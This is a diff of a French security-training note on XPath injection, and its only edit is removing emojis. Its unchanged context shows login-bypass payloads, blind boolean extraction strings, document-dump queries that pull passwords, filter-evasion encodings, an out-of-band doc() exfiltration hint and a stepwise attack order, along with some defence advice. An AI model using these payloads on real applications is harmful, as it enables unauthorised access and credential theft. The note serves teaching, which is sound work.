@@ -12,7 +12,7 @@ statut: publie
 
 
 
-# 🔍 XPATH Injection
+# XPATH Injection
 
 > [!info] **En 1 phrase**
 > XPath Injection = injecter du code XPath dans une requête XML en manipulant des **entrées utilisateur**
@@ -22,7 +22,7 @@ statut: publie
 
 ---
 
-## 🎯 Concept
+## Concept
 
 ```mermaid
 flowchart LR
@@ -34,14 +34,14 @@ flowchart LR
     C --> G[Exfiltration OOB<br>doc⁽ ⁾ / URI]
 ```
 
-> [!info] 💡 **Pourquoi ça marche**
+> [!info] **Pourquoi ça marche**
 > Quand l'app concatène l'entrée dans une expression XPath sans la valider
 > (`string(//user[name/text()='` + `$input` + `']/pass/text())`), on peut **sortir du prédicat**
 > et réécrire la condition. XPath n'a **aucun paramétrage natif** : seule la validation stricte protège.
 
 ---
 
-## 🧭 Rappel XPath
+## Rappel XPath
 
 XPath = langage de navigation sur un **arbre XML**. Il sert aussi de langage de requête
 pour des bases « XML natives » (fichiers .xml, SOAP, REST XML, LDAP-like, configs).
@@ -89,11 +89,11 @@ starts-with(x,'y')          # préfixe
 translate(x,'abc','XYZ')    # remplacement de caractères (bypass filtres)
 ```
 
-> [!tip] 💡 **XPath est indexé à partir de 1** (pas 0 comme SQL/PHP) : `substring(x,1,1)` = premier caractère.
+> [!tip] **XPath est indexé à partir de 1** (pas 0 comme SQL/PHP) : `substring(x,1,1)` = premier caractère.
 
 ---
 
-## 🚪 Authentication Bypass
+## Authentication Bypass
 
 ```xpath
 -- Requête initiale (typique)
@@ -116,7 +116,7 @@ admin' or '1'='1
 ' or 1=1 and ''='
 ```
 
-> [!warning] ⚠️ **Ordre d'évaluation des opérateurs** : `and` est évalué AVANT `or`
+> [!warning] **Ordre d'évaluation des opérateurs** : `and` est évalué AVANT `or`
 > dans les prédicats XPath. Un `' or '1'='1` seul peut ne pas suffire selon la position de la
 > variable dans la condition — d'où le double `' or '1'='1' or '1'='1` qui neutralise les deux côtés.
 
@@ -129,7 +129,7 @@ admin' or '1'='1
 
 ---
 
-## 🙈 Blind XPath
+## Blind XPath
 
 > Quand les résultats ne sont plus affichés, on interroge par **oracle booléen** : la page
 > répond différemment (login OK / pas de résultat / message d'erreur) selon que la condition est vraie ou fausse.
@@ -179,7 +179,7 @@ admin' or '1'='1
 ' and string-length(//user[userid=1]/username)=string-length(//user[userid=1]/username) and '1'='1
 ```
 
-> [!tip] 💡 Le time-based XPath pur est **rarement fiable** (le doc XML est souvent petit).
+> [!tip] Le time-based XPath pur est **rarement fiable** (le doc XML est souvent petit).
 > Préférer le **boolean based** ; garder le timing pour détecter la présence d'une app lente
 > ou pour l'exfiltration OOB.
 
@@ -211,7 +211,7 @@ for pos in range(1, 30):
 
 ---
 
-## 📂 Information Disclosure (dump du document)
+## Information Disclosure (dump du document)
 
 > Contrairement au SQLi, pas de `information_schema` : **l'exploration se fait par la structure
 > de l'arbre elle-même** (`//*`, `name()`, `count()`, `text()`). On peut récupérer TOUT le fichier XML.
@@ -237,14 +237,14 @@ string(//user[role='admin']/password)
 concat(//user[1]/name/text(), ':', //user[1]/password/text())
 ```
 
-> [!tip] 💡 **Contextes d'utilisation**
+> [!tip] **Contextes d'utilisation**
 > - Résultat **affiché** → dump direct via `//*` ou `//node()`.
 > - Résultat **utilisé dans une condition** → blind (ci-dessus).
 > - Résultat **invisible** → OOB (`doc()` / appels réseau) ou time-based.
 
 ---
 
-## 🧱 Bypass de filtres
+## Bypass de filtres
 
 > Les WAF/filtres bloquent souvent les mots-clés (`and`, `or`, `contains`, `//`) ou les quotes.
 > XPath offre **énormément de fonctions équivalentes**.
@@ -278,13 +278,13 @@ string(//user[translate(name(),'p','P')='PASSWORD']/../password)
 &#x27; or &#x31;&#x3D;&#x31;
 ```
 
-> [!warning] ⚠️ **Les fonctions XPath sont case-sensitive** : `contains()` ≠ `Contains()`.
+> [!warning] **Les fonctions XPath sont case-sensitive** : `contains()` ≠ `Contains()`.
 > Ne pas sur-obfusquer : un filtre par défaut qui bloque `contains` sera souvent aussi
 > contourné par `starts-with`, `substring`, `translate` ou `normalize-space`.
 
 ---
 
-## 🛠️ Outils
+## Outils
 
 | Outil | Usage |
 |---|---|
@@ -307,7 +307,7 @@ string(//user[translate(name(),'p','P')='PASSWORD']/../password)
 
 ---
 
-## 🔍 Détection & Défense
+## Détection & Défense
 
 | Réponse | Détail |
 |---|---|
@@ -322,16 +322,16 @@ string(//user[translate(name(),'p','P')='PASSWORD']/../password)
 
 ---
 
-## ⚠️ Tips & Pièges
+## Tips & Pièges
 
-> [!tip] 💡 **Ordre logique d'attaque**
+> [!tip] **Ordre logique d'attaque**
 > 1. Tester `' " ) ( / * @` → erreur = parseur XML = candidat.
 > 2. Confirmer : `' or '1'='1` (login OK) puis `' and '1'='2` (login KO).
 > 3. Résultat affiché ? → dump direct (`//*`, `//node()`).
 > 4. Sinon → blind boolean, extraction `string-length` + `substring` (+ dichotomie).
 > 5. Aucune différence ? → timing ou OOB (`doc('//IP/...')`).
 
-> [!warning] ⚠️ **Pièges à connaître**
+> [!warning] **Pièges à connaître**
 > - **Contexte (query vs result)** : injecter dans la *query* modifie ce qu'on cherche ;
 >   injecter dans la *condition d'affichage* modifie ce qu'on lit. Le même payload n'agit pas pareil.
 > - **XPath est typé sur les chaînes** : `1=1` peut être traité comme comparaison de chaînes ;
@@ -344,10 +344,10 @@ string(//user[translate(name(),'p','P')='PASSWORD']/../password)
 
 ---
 
-## 🔗 Liens
+## Liens
 
-- [[Injection SQL|💾 SQLi]] — la même logique côté bases SQL (paramétrage, blind, dump)
-- [[XXE|📄 XXE]] — injection XML côté parseur (lecture de fichiers / SSRF via entités)
-- [[LDAP Injection|🎭 LDAP]] — requêtes de filtrage avec conditions `&` `|`, blind similaire
-- → Note complète : [[03 - Exploitation Web|🌍 Exploitation Web]]
-- 📚 Source : [PayloadsAllTheThings — XPath Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XPATH%20Injection/README.md)
+- [[Injection SQL| SQLi]] — la même logique côté bases SQL (paramétrage, blind, dump)
+- [[XXE| XXE]] — injection XML côté parseur (lecture de fichiers / SSRF via entités)
+- [[LDAP Injection| LDAP]] — requêtes de filtrage avec conditions `&` `|`, blind similaire
+- → Note complète : [[03 - Exploitation Web| Exploitation Web]]
+- Source : [PayloadsAllTheThings — XPath Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XPATH%20Injection/README.md)
